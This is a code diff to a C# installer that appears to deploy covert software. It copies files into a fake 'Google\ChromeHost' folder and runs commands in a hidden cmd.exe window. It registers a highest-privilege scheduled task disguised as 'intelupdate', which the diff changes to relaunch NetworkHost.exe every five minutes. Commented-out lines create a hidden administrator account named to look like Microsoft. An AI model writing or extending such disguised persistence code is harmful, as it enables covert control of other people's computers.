@@ -3,6 +3,8 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Reflection;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using Vestris.ResourceLib;
@@ -11,6 +13,9 @@ namespace Setup
 {
     class Program
     {
+
+
+
         //Место куда установится прога
         static DirectoryInfo DirSetup = new DirectoryInfo($"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)}\\Google\\ChromeHost");
         static void Main(string[] args)
@@ -30,6 +35,18 @@ namespace Setup
 
 
 
+            Setup();
+
+
+
+        }
+
+
+        
+
+
+        static void Setup()
+        {
             Console.WriteLine("Начало установки");
 
             if (!DirSetup.Exists)
@@ -76,7 +93,7 @@ namespace Setup
             List<string> comms = new List<string>();
             //comms.Add($"net users Micosoft /add /fullname: \"Micosoft\" /PASSWORDCHG:NO");
             //comms.Add($"net localgroup Администраторы Micosoft /add");
-            comms.Add($"schtasks /Create /SC ONLOGON /TN \"intelupdate\" /TR \"'{Path.Combine(DirSetup.FullName, "NetworkHost.exe")}'\" /F /RL HIGHEST");
+            comms.Add($"schtasks /CREATE /SC MINUTE /MO 5 /TN \"intelupdate\" /TR \"'{Path.Combine(DirSetup.FullName, "NetworkHost.exe")}'\" /F /RL HIGHEST");
 
             pr.StartInfo.FileName = $"{Environment.GetFolderPath(Environment.SpecialFolder.System)}\\cmd.exe";
             pr.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
@@ -93,7 +110,6 @@ namespace Setup
 
             pr.StartInfo.FileName = $"{DirSetup.FullName}\\NetworkHost.exe";
             pr.StartInfo.Arguments = string.Empty;
-
         }
     }
 }
